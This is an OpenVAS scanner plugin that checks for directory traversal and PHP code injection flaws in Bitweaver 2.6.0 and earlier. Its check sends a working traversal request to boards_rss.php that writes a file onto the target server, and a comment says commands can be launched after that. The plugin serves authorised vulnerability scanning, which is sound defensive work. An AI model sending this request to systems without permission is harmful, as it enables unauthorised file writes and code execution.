###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_bitweaver_dir_trav_n_code_inj_vuln.nasl 15 2013-10-27 12:49:54Z jan $
#
# Bitweaver Directory Traversal And Code Injection Vulnerabilities
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let the attacker to cause PHP code injection,
  directory traversal, gain sensitive information, and can cause arbitrary
  code execution inside the context of the web application.
  Impact Level: Application";
tag_affected = "Bitweaver version 2.6.0 and prior";
tag_insight = "Multiple flaws are due to improper handling of user supplied input in saveFeed
  function in rss/feedcreator.class.php file and it can cause following attacks.
  - PHP code injection via placing PHP sequences into the account 'display name'
    setting for authenticated users or in the HTTP Host header for remote users
    by sending a request to boards/boards_rss.php.
  - Directory traversal allow remote user to create or overwrite arbitrary file
    via a .. (dot dot) in the version parameter to boards/boards_rss.php.";
tag_solution = "Upgrade to Bitweaver version 2.6.1 or later
  http://www.bitweaver.org/downloads/file/16337";
tag_summary = "This host is running Bitweaver, which is prone to directory traversal and
  code injection vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.900356";
CPE = "cpe:/a:bitweaver:bitweaver";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-05-26 15:05:11 +0200 (Tue, 26 May 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_cve_id("CVE-2009-1677", "CVE-2009-1678");
  script_bugtraq_id(34910);
  script_name("Bitweaver Directory Traversal And Code Injection Vulnerabilities");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Check for the version of Bitweaver");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_bitweaver_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("Bitweaver/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://secunia.com/advisories/35057");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/8659");
  script_xref(name : "URL" , value : "http://www.bitweaver.org/articles/121");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("host_details.inc");

if(!bitweaverPort = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

if(dir != NULL)
{
  # if short_open_tag in php.ini is off (because of "<?xml ..." preamble
  # generating a parse error with short_open_tag = on), you can now launch
  # commands:

  pocReq = http_get(item:string(dir + "/boards/boards_rss.php?version=" +
                                      "/../../../../bookoo.php \r\n\r\n"),
                                port:bitweaverPort);
  rcvRes = http_send_recv(port:bitweaverPort, data:pocReq);

  if("Set-Cookie: BWSESSION" >< rcvRes &&
      egrep(pattern:"^HTTP/.* 200 OK", string:rcvRes))
  {
    pocReq = http_get(item:string(dir + "/bookoo.php.xml \r\n\r\n"),
                      port:bitweaverPort);
    rcvRes = http_send_recv(port:bitweaverPort, data:pocReq);

    if(egrep(pattern:"^HTTP/.* 200 OK", string:rcvRes) &&
       "<title> Feed</title>" >< rcvRes)
    {
      security_hole(bitweaverPort);
      exit(0);
    }
  }
}

